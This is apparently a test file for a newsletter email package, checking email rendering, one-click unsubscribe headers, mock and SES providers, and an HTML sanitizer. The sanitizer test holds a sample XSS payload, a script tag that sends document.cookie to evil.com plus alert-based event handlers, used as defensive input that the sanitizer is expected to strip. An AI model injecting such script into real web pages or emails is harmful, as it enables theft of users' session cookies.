import { describe, it, expect } from "bun:test";
import {
  renderConfirmationEmail,
  renderWelcomeEmail,
  renderNewsletterEmail,
  ConsoleMockEmailProvider,
  SesEmailProvider,
  sanitizeNewsletterHtml,
} from "../../packages/email/src/index";

describe("Email Rendering, Sanitization & Provider Abstractions", () => {
  const provider = new ConsoleMockEmailProvider();

  it("renders double opt-in confirmation email correctly", () => {
    const confirm = renderConfirmationEmail({
      email: "reader@aisignal.dev",
      confirmUrl: "https://aisignal.dev/confirm?token=dummy_test_token",
    });

    expect(confirm.html).toContain("Confirm Subscription");
    expect(confirm.text).toContain("dummy_test_token");
  });

  it("renders welcome email with clear unsubscribe options", () => {
    const welcome = renderWelcomeEmail({
      email: "reader@aisignal.dev",
      unsubscribeUrl: "https://aisignal.dev/unsubscribe?token=dummy_unsub_token",
    });

    expect(welcome.html).toContain("Welcome to AI Signal");
    expect(welcome.html).toContain("dummy_unsub_token");
  });

  it("generates correct RFC 8058 List-Unsubscribe API endpoint and web body URLs", () => {
    const issue = renderNewsletterEmail({
      issueNumber: 1,
      issueDate: "October 17, 2026",
      title: "Frontier Reasoning & Inference Scaling",
      previewText: "Test-time compute analysis",
      htmlContent: "<h2>Three Developments</h2>",
      recipientEmail: "reader@aisignal.dev",
      unsubscribeApiUrl: "https://aisignal.dev/api/unsubscribe?token=api_token_123",
      unsubscribeWebUrl: "https://aisignal.dev/unsubscribe?token=web_token_123",
      archiveUrl: "https://aisignal.dev/archive/1",
    });

    // List-Unsubscribe MUST point to the API endpoint that handles POST
    expect(issue.headers["List-Unsubscribe"]).toBe("<https://aisignal.dev/api/unsubscribe?token=api_token_123>");
    expect(issue.headers["List-Unsubscribe-Post"]).toBe("List-Unsubscribe=One-Click");

    // Email body must point to the web confirmation page
    expect(issue.html).toContain("https://aisignal.dev/unsubscribe?token=web_token_123");
    expect(issue.text).toContain("https://aisignal.dev/unsubscribe?token=web_token_123");
  });

  it("sanitizes malicious script tags and dangerous event handlers from HTML", () => {
    const maliciousHtml = `
      <h2>Frontier Model Breakthrough</h2>
      <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
      <p onclick="alert('XSS')">Click for details</p>
      <a href="javascript:alert('malicious')">Dangerous link</a>
      <img src="https://aisignal.dev/logo.png" onload="alert('hack')" />
    `;

    const cleanHtml = sanitizeNewsletterHtml(maliciousHtml);

    expect(cleanHtml).not.toContain("<script>");
    expect(cleanHtml).not.toContain("onclick");
    expect(cleanHtml).not.toContain("onload");
    expect(cleanHtml).not.toContain("javascript:");
    expect(cleanHtml).toContain("<h2>Frontier Model Breakthrough</h2>");
    expect(cleanHtml).toContain('src="https://aisignal.dev/logo.png"');
  });

  it("dispatches emails through console mock provider in development", async () => {
    const result = await provider.sendEmail({
      to: "reader@aisignal.dev",
      subject: "Test Issue Dispatch",
      html: "<p>Hello</p>",
      text: "Hello",
    });

    expect(result.success).toBe(true);
    expect(result.messageId.startsWith("mock_")).toBe(true);
    expect(result.provider).toBe("console");
  });

  it("fails closed in SesEmailProvider when AWS credentials are not configured", async () => {
    const sesProvider = new SesEmailProvider();
    const result = await sesProvider.sendEmail({
      to: "reader@aisignal.dev",
      subject: "Test SES Dispatch",
      html: "<p>SES</p>",
      text: "SES",
    });

    // Must return false and not mock success
    expect(result.success).toBe(false);
    expect(result.error).toContain("AWS_ACCESS_KEY_ID or AWS_SECRET_ACCESS_KEY");
  });
});
